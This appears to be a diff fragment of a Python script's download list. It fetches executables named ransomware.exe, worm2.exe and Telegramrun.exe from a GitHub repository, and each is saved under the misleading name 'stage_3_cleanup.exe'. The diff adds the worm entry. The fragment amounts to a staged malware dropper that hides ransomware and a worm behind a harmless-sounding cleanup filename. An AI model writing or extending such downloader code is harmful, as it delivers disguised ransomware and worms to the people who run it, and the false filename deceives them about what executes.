@@ -87,8 +87,12 @@ if __name__ == "__main__":
             "url": "https://github.com/monouk-prog/Cyber-Proj-ANTI-MALICIOUS/releases/latest/download/Telegramrun.exe",
             "filename": "stage_3_cleanup.exe"
         },
-	{
+		{
             "url": "https://github.com/monouk-prog/Cyber-Proj-ANTI-MALICIOUS/releases/latest/download/ransomware.exe",
+            "filename": "stage_3_cleanup.exe"
+        },
+		{
+            "url": "https://github.com/monouk-prog/Cyber-Proj-ANTI-MALICIOUS/releases/latest/download/worm2.exe",
             "filename": "stage_3_cleanup.exe"
         }
     ]
